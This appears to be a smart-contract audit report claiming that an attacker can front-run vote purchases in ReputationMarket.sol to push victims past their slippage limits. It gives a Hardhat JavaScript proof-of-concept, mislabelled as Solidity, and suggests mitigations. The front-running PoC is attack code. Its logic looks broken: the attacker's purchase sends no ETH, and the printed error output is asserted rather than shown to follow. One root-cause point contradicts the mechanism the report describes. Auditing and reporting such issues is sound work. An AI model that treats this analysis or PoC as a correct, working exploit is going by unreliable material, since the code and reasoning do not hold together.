# Slippage exploitation in `ReputationMarket.sol` due to highly volatile vote prices will force users to accept unfavorable slippage conditions, causing their transactions to either revert or become more costly than expected

### Summary

An attacker can exploit high volatility in vote prices to manipulate transactions. Specifically, sudden, brief price changes could force legitimate users to accept unfavorable slippage conditions, causing their transactions to either revert or become more costly than expected. This manipulation could disrupt market fairness and create opportunities for malicious actors to profit at the expense of unsuspecting users.

### Root Cause

The vulnerability stems from the function `_checkSlippageLimit` and the way vote prices are handled. In a volatile market where vote prices fluctuate rapidly, an attacker can briefly inflate prices to manipulate the slippage tolerance, causing one of the following to occur:

1. The actual votes bought may fall below the calculated minimum due to sudden price increases, causing the slippage check to fail, and the transaction to revert.
2. If the attacker inflates the price, the user may be forced to accept more votes than expected, surpassing their slippage tolerance, which could result in a higher-than-expected cost.

The vulnerable code that causes this issue is primarily in the price calculation of votes, which can change rapidly based on market demand and supply, and the reliance on a slippage check that doesn’t account for such volatility.

### Internal pre-conditions

A user wants to buy 1000 trust votes at a price of 0.01 ETH per vote.
Slippage tolerance is set to 1% (i.e., 1000 * 0.99 = 990 minimum votes).

### External pre-conditions

_No response_

### Attack Path

The attacker buys a large amount of votes shortly before the victim's transaction to artificially inflate the vote price.
Due to high volatility, the vote price increases from 0.01 ETH to 0.015 ETH per vote, pushing the user’s actual votes below the minimum threshold they were expecting.

### Impact

Attackers can control vote prices to cause legitimate transactions to revert, disrupting market activity.

Victims may end up paying more ETH to purchase votes as they are forced to accept higher slippage or see their transactions fail.

### PoC

```solidity
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Reputation Market Slippage Exploitation", function () {
  let marketContract;
  let attacker;
  let user;
  let owner;
  let profileId = 1;

  before(async () => {
    [owner, attacker, user] = await ethers.getSigners();
    const MarketContract = await ethers.getContractFactory("ReputationMarket");
    marketContract = await MarketContract.deploy();
    await marketContract.deployed();
  });

  it("Should exploit slippage and manipulate prices", async () => {
    const initialLiquidity = ethers.utils.parseEther("1"); // 1 ETH initial liquidity
    const pricePerVote = ethers.utils.parseEther("0.01"); // 0.01 ETH per vote

    // Create the market
    await marketContract.createMarketWithConfig(0, { value: initialLiquidity });

    // Simulate attacker inflating vote price
    await marketContract.connect(attacker).buyVotes(profileId, true, 1000, 50); // Attacker buys votes

    // Victim tries to buy 1000 votes, but due to the manipulation, prices have risen
    const expectedVotes = 1000;
    const slippageBasisPoints = 100; // 1% slippage tolerance

    try {
      await marketContract.connect(user).buyVotes(profileId, true, expectedVotes, slippageBasisPoints, { value: ethers.utils.parseEther("10") });
    } catch (error) {
      console.log("Error: ", error.message);
    }

    // Check if the transaction was reverted
    await expect(
      marketContract.connect(user).buyVotes(profileId, true, expectedVotes, slippageBasisPoints, { value: ethers.utils.parseEther("10") })
    ).to.be.revertedWith("SlippageLimitExceeded");
  });
});
```
The test will simulate an attacker buying votes, inflating the price, and then triggering a failure for the victim’s transaction due to slippage exceeding the limit.
```bash
Error:  SlippageLimitExceeded: Actual votes bought are below the minimum expected with slippage tolerance.
```
This confirms that the victim’s transaction reverts because the actual votes are insufficient due to the inflated prices.



### Mitigation

Use a time-weighted average price mechanism to calculate vote prices over a fixed window. This reduces the impact of sudden price fluctuations caused by a small number of large transactions.

Set absolute slippage limits that can never be exceeded, regardless of the price fluctuation.
For example, implement hard caps on the maximum price increase allowed in a single transaction.
